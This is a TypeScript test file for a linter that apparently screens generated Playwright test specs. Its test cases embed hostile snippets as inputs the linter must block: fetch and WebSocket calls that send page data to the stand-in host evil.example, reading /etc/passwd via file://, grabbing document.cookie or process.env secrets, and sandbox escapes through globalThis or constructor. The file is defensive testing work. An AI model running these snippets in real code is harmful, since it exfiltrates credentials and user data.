import { describe, expect, it } from "vitest";
import { lintAutomationCode } from "./code-lint";

const clean = `import { test, expect } from "@playwright/test";

test("RF-TC-002 Reject malformed URL", async ({ page }) => {
  await page.goto("/");
  await page.getByLabel(/Campaign URL/i).fill("not-a-url");
  await expect(page.getByRole("alert")).toBeVisible();
});
`;

describe("automation code lint", () => {
  it("passes a clean spec", () => {
    expect(lintAutomationCode(clean)).toEqual({ errors: [], warnings: [] });
  });

  it.each([
    ['import fs from "node:fs";', "node:fs"],
    ['const cp = require("child_process");', "require"],
    ["const key = process.env.SECRET;", "process.env"],
    ['eval("1+1");', "eval"],
    ['await import("os");', "Dynamic import"],
    ["test.only('x', async () => {});", "test.only"],
    ['await fetch("https://evil.example/" + location.href);', "fetch()"],
    ["const xhr = new XMLHttpRequest();", "XMLHttpRequest"],
    ['new WebSocket("wss://evil.example");', "WebSocket"],
    ['await page.request.get("https://api.example.com");', "request API"],
    ['await page.goto("file:///etc/passwd");', "file://"],
    ["const c = await page.evaluate(() => document.cookie);", "document.cookie"],
  ])("blocks %s", (snippet, fragment) => {
    const report = lintAutomationCode(clean.replace('await page.goto("/");', `await page.goto("/");\n  ${snippet}`) + (snippet.startsWith("import") ? `\n${snippet}` : ""));
    expect(report.errors.join(" ")).toContain(fragment);
  });

  it("requires the Playwright import and a test block", () => {
    expect(lintAutomationCode("console.log(1)").errors).toEqual(
      expect.arrayContaining([expect.stringContaining("@playwright/test"), expect.stringContaining("No test() block")]),
    );
    expect(lintAutomationCode("").errors).toEqual(["The spec is empty."]);
  });

  it("warns about flaky or unfinished specs", () => {
    const report = lintAutomationCode(clean.replace("await expect(page.getByRole(\"alert\")).toBeVisible();", "await page.waitForTimeout(1000); // TODO"));
    expect(report.errors).toEqual([]);
    const warnings = report.warnings.join(" ");
    expect(warnings).toContain("waitForTimeout");
    expect(warnings).toContain("TODO");
  });
});

describe("lintAutomationCode escape hatches", () => {
  const wrap = (body: string) => `import { test, expect } from "@playwright/test";\ntest("x", async ({ page }) => {\n${body}\n  await expect(page).toHaveTitle(/x/);\n});\n`;
  it.each([
    "const p = globalThis;",
    "const e = page[\"constructor\"];",
    "const f = (() => {}).constructor;",
    "const g = global.process;",
    "const m = module;",
  ])("blocks %s", (body) => {
    expect(lintAutomationCode(wrap(body)).errors.length).toBeGreaterThan(0);
  });
  it("ignores forbidden words inside strings and comments", () => {
    const report = lintAutomationCode(wrap('  // the process is documented\n  await page.getByText("Our process").click();'));
    expect(report.errors).toEqual([]);
  });

  it("blocks the request fixture as a test parameter", () => {
    const report = lintAutomationCode(clean.replace("async ({ page })", "async ({ page, request })"));
    expect(report.errors.join(" ")).toContain("request API");
  });

  it("keeps absolute page.goto() as a warning only", () => {
    const report = lintAutomationCode(clean.replace('page.goto("/")', 'page.goto("https://app.example.com/")'));
    expect(report.errors).toEqual([]);
    expect(report.warnings.join(" ")).toContain("absolute URL");
  });

  it("warns (never errors) when the only assertion is body visibility", () => {
    const report = lintAutomationCode(
      clean.replace('await expect(page.getByRole("alert")).toBeVisible();', 'await expect(page.locator("body")).toBeVisible();'),
    );
    expect(report.errors).toEqual([]);
    expect(report.warnings.join(" ")).toContain("does not check the actual result");
  });
});
